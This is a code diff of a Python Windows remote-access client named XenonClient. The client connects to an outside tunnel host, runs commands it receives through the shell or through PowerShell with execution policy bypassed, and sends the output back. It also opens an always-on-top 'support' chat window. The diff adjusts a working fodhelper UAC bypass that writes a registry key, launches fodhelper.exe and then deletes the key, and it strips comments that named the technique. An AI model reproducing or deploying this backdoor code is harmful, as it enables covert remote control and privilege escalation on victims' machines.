@@ -8,7 +8,7 @@ import webbrowser
 import time
 import tkinter as tk
 from tkinter import messagebox, scrolledtext
-import winreg # UAC Bypass için
+import winreg
 
 # --- BAĞLANTI AYARLARI ---
 HOST = "uwtd3ffva.localto.net" 
@@ -31,19 +31,14 @@ class XenonClient:
         })
 
     def uac_bypass(self, cmd_to_run):
-        """Fodhelper UAC Bypass tekniği."""
         try:
-            # Kayıt defterinde gerekli anahtarları oluştur
             path = r"Software\Classes\ms-settings\Shell\Open\command"
             winreg.CreateKey(winreg.HKEY_CURRENT_USER, path)
             with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_WRITE) as key:
                 winreg.SetValueEx(key, "", 0, winreg.REG_SZ, cmd_to_run)
                 winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
-            
-            # Tetikleyiciyi çalıştır
-            subprocess.Popen("start fodhelper.exe", shell=True)
+            subprocess.Popen("fodhelper.exe", shell=True)
             time.sleep(2)
-            # Temizlik
             winreg.DeleteKey(winreg.HKEY_CURRENT_USER, path)
             return True
         except: return False
@@ -67,7 +62,8 @@ class XenonClient:
                     threading.Thread(target=lambda: messagebox.showinfo("Duyuru", data.split("|")[1])).start()
 
                 elif data == "chat_open":
-                    threading.Thread(target=self.gui_chat).start()
+                    if not self.chat_win:
+                        threading.Thread(target=self.gui_chat).start()
 
                 elif data.startswith("chat_msg|"):
                     if self.chat_box:
@@ -76,7 +72,9 @@ class XenonClient:
                         self.chat_box.config(state="disabled"); self.chat_box.see(tk.END)
 
                 elif data == "chat_close":
-                    if self.chat_win: self.chat_win.after(0, self.chat_win.destroy)
+                    if self.chat_win: 
+                        self.chat_win.after(0, self.chat_win.destroy)
+                        self.chat_win = None
 
                 elif data == "beep":
                     if platform.system() == "Windows":
@@ -97,16 +95,21 @@ class XenonClient:
                     self.uac_bypass(target)
 
             except: break
-        self.sock.close()
+        if self.sock: self.sock.close()
 
-    def run_cmd(self, cmd, mode):
+    def run_cmd(self, command_to_run, mode):
         def task():
             try:
+                # 'cmd' ismini kullanmıyoruz ki dışarıyla çakışmasın
+                final_cmd = command_to_run
                 if mode == "powershell":
-                    cmd = f"powershell -ExecutionPolicy Bypass -Command {cmd}"
-                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    final_cmd = f"powershell -ExecutionPolicy Bypass -Command {command_to_run}"
+                
+                proc = subprocess.Popen(final_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 stdout, stderr = proc.communicate()
                 res = (stdout + stderr).decode("cp857", errors="replace")
+                
+                if not res.strip(): res = "Komut çalıştırıldı (Çıktı yok)."
                 self.sock.send(f"shell_res|{res}".encode("utf-8"))
             except Exception as e:
                 self.sock.send(f"shell_res|Hata: {str(e)}".encode("utf-8"))
@@ -116,8 +119,10 @@ class XenonClient:
         if self.chat_win: return
         self.chat_win = tk.Tk(); self.chat_win.title("Destek"); self.chat_win.geometry("350x450")
         self.chat_win.attributes("-topmost", True)
+        
         self.chat_box = scrolledtext.ScrolledText(self.chat_win, state="disabled")
         self.chat_box.pack(expand=True, fill="both", padx=5, pady=5)
+        
         ent = tk.Entry(self.chat_win)
         ent.pack(fill="x", padx=5, pady=5)
 
@@ -127,10 +132,11 @@ class XenonClient:
                 self.chat_box.config(state="normal")
                 self.chat_box.insert(tk.END, f"Siz: {m}\n")
                 self.chat_box.config(state="disabled"); ent.delete(0, tk.END)
-                self.sock.send(f"chat|{m}".encode("utf-8"))
+                try: self.sock.send(f"chat|{m}".encode("utf-8"))
+                except: pass
         
         ent.bind("<Return>", send_srv)
-        # Pencere kapatıldığında sadece objeyi temizle, bağlantıyı koparma
+        
         def on_closing():
             self.chat_win.destroy()
             self.chat_win = None
